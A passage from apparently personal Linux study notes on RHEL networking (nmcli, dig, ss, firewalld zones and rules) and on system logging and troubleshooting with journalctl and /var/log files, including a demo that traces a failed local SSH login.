
- The interface name (e.g., `ens192`)
    
- IP address and subnet
    
- Whether it's up


## 8.2 DNS and Connectivity Tools

### 🔧 Command Cheat Sheet

|Command|Purpose|Example|
|---|---|---|
|`dig`|DNS lookup (like nslookup)|`dig google.com`|
|`curl`|HTTP/HTTPS request tester|`curl -I https://example.com`|
|`ss -tuln`|Show open ports and services|`ss -tuln`|

```bash
nmcli connection show
```

This lists all active and inactive connections:

```
NAME      UUID                                  TYPE      DEVICE
Wired     abc123...                             ethernet  ens192
```

Other useful nmcli commands:

```bash
nmcli device status
nmcli con up Wired
```

`nmcli` is great for scripting and automation — it's way better than editing `/etc/sysconfig/network-scripts` manually.
If youre in a pinch use nmtui. Its nice and graphical-ish

![[Pasted image 20250520195943.png]]


## 8.4 Firewalld and Zones

**firewalld** manages the firewall in RHEL/CentOS/Rocky — it uses **zones** to define trust levels per interface.

### 🔥 Zones Concept

|Zone|Description|
|---|---|
|`public`|Default zone for general connections|
|`internal`|For trusted LAN devices|
|`dmz`|Isolated zone for exposed services|
|`drop`|Drops all incoming traffic silently|
|`trusted`|Allows all traffic|


🔍 Check Current Rules
```bash
firewall-cmd --list-all
```

![[Pasted image 20250520200220.png]]

This shows:

- Default zone
    
- Open ports
    
- Allowed services

🔁 Reload or Change Rules

```
firewall-cmd --add-port=8080/tcp --permanent
firewall-cmd --reload

```

File based management:

Theres also the defined files at /etc/sysconfig/network-scripts/ifcfg-ifname

example:
![[Pasted image 20250520200544.png]]

🧪 Demo:

```
ip a                         # See IPs and interfaces
nmcli connection show        # List configured network connections
ss -tuln                     # Check for listening services
firewall-cmd --list-all      # Check current firewall rules
dig starbucks.com               # Check DNS
curl -I https://www.army.mil   # See HTTP headers (no body)
```

# 🪵 Chapter 9: Logs & Troubleshooting – Reading the Story Your System Is Telling

![[Pasted image 20250520201321.png]]

> _"When something breaks in Linux, the logs know before you do."_

Understanding Linux logging is critical for diagnosing issues quickly — especially in production. This chapter focuses on how to **triage problems using logs**, understand the logging system, and apply filters with `journalctl`.

---

## 9.1 How Logging Works in RHEL

RHEL systems use a combination of:

| Component     | Role                                                              |
|---------------|-------------------------------------------------------------------|
| `rsyslog`     | Traditional syslog service — routes logs to `/var/log/` files     |
| `systemd-journald` | Captures logs from systemd-managed services into the journal |
| `auditd`      | Captures security-related events (SELinux, sudo, etc.)            |

Logs go to files **and/or** the `systemd` journal, depending on system config.

---

## 9.2 Important Log Files

| File                         | What It's For                                              |
|------------------------------|------------------------------------------------------------|
| `/var/log/messages`         | General system logs (boot, daemons, services)             |
| `/var/log/secure`           | Security events — logins, sudo, SSH                       |
| `/var/log/audit/audit.log`  | SELinux denials, system policy events                     |
| `/var/log/cron`             | Cron job activity                                          |
| `/var/log/dnf.log`          | Package management history                                |
| `/var/log/httpd/*`          | Apache logs, if installed                                 |

> 📎 `messages` and `secure` are your go-to logs for most system troubleshooting.

---

## 9.3 journalctl – Your Log Dashboard

`journalctl` reads from the systemd journal — a unified logging system with advanced filters.

### Common Filters:

| Command                                  | Purpose                                 |
|------------------------------------------|-----------------------------------------|
| `journalctl -xe`                         | View recent errors                      |
| `journalctl -u sshd`                     | Logs for a specific service             |
| `journalctl --since today`              | Logs from today                         |
| `journalctl -b -1`                       | Logs from previous boot                 |
| `journalctl -f`                          | Live view of logs (like `tail -f`)      |

---

## 9.4 Troubleshooting Methodology

When something breaks, follow this approach:

### 🔍 Triage Flow:
1. **Reproduce the issue** (if safe)
2. **Identify the affected service or process**
3. **Check system logs**:
    ```bash
    journalctl -xe
    journalctl -u <service>
    ```
4. **Check traditional logs**:
    ```bash
    less /var/log/messages
    less /var/log/secure
    ```
5. **Look for keywords**:
   - `failed`, `denied`, `segfault`, `timeout`, `unauthorized`, `refused`

---

## 🧪 Demo: Trace a Failed SSH Login

1. Attempt an SSH login with incorrect credentials:
    ```bash
    ssh baduser@localhost
    ```

2. Check the logs:
    ```bash
    journalctl -u sshd --since -5m
    ```

3. Or with grep:
    ```bash
    grep sshd /var/log/secure
    ```

You’ll see log entries like:
```
sshd[12345]: Failed password for invalid user baduser from 192.168.1.10 port 52522 ssh2
```

---

## 🧠 Real-World Advice

- `journalctl` is your first stop for systemd-managed services.
- Combine logs with `grep`, `less`, and `awk` to surgically extract what you need.
- Automate log review with monitoring tools or alerting pipelines (Splunk, ELK, etc).

> _“Linux doesn’t fail silently — you just have to know where to listen.”_
